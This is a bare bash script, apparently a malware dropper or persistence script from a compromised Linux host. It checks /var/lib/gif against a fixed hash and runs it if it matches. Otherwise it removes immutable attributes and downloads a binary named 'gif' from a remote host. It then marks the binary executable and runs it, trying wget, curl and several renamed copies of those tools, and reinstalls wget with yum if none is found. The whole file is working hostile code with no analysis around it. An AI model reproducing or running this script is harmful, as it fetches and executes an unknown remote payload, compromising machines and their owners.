#!/bin/bash
PATH=$PATH:/usr/bin:/bin:/sbin:/usr/sbin:/usr/local/bin:/usr/local/sbin


    cd /var/lib
    if [ -x "/usr/bin/md5sum" -o -x "/bin/md5sum" ];then
	sum=`md5sum gif|grep 83de80a0bb9df5f4eb045b5f9436ecca|grep -v grep |wc -l`
	if [ $sum -eq 1 ]; then
		chmod +x /var/lib/gif
		/var/lib/gif
		exit 0
        fi
    fi

    chattr -ia -R /var/lib/gif  > /dev/null 2>&1
    /bin/rm -rf /var/lib/gif

    if [ -x "/usr/bin/wget"  -o  -x "/bin/wget" ]; then
   	wget -c http://y.shavsl.com/gif -O /var/lib/gif && chmod +x /var/lib/gif && /var/lib/gif
    elif [ -x "/usr/bin/curl"  -o  -x "/bin/curl" ]; then
   	curl -fs http://y.shavsl.com/gif -o /var/lib/gif && chmod +x /var/lib/gif && /var/lib/gif
    elif [ -x "/usr/bin/wge"  -o  -x "/bin/wge" ]; then
   	wge -c http://y.shavsl.com/gif -O /var/lib/gif && chmod +x /var/lib/gif && /var/lib/gif
    elif [ -x "/usr/bin/get"  -o  -x "/bin/get" ]; then
   	get -c http://y.shavsl.com/gif -O /var/lib/gif && chmod +x /var/lib/gif && /var/lib/gif
    elif [ -x "/usr/bin/cur"  -o  -x "/bin/cur" ]; then
   	cur -fs http://y.shavsl.com/gif -o /var/lib/gif && chmod +x /var/lib/gif && /var/lib/gif
    elif [ -x "/usr/bin/url"  -o  -x "/bin/url" ]; then
   	url -fs http://y.shavsl.com/gif -o /var/lib/gif && chmod +x /var/lib/gif && /var/lib/gif
    elif [ -x "/usr/bin/cd1"  -o  -x "/bin/cd1" ]; then
   	cd1 -fs http://y.shavsl.com/gif -o /var/lib/gif && chmod +x /var/lib/gif && /var/lib/gif
    elif [ -x "/usr/bin/cdt"  -o  -x "/bin/cdt" ]; then
   	cdt -fs http://y.shavsl.com/gif -o /var/lib/gif && chmod +x /var/lib/gif && /var/lib/gif
    elif [ -x "/usr/bin/wd1"  -o  -x "/bin/wd1" ]; then
   	wd1 -c http://y.shavsl.com/gif -O /var/lib/gif && chmod +x /var/lib/gif && /var/lib/gif
    elif [ -x "/usr/bin/lwp-download"  -o  -x "/bin/lwp-download" ]; then
        lwp-download  http://y.shavsl.com/gif /var/lib/gif && chmod +x /var/lib/gif && /var/lib/gif
    else
   	rpm -e --nodeps wget
   	yum -y install wget
   	wget -c http://y.shavsl.com/gif -O /var/lib/gif && chmod +x /var/lib/gif && /var/lib/gif
    fi
    exit 0

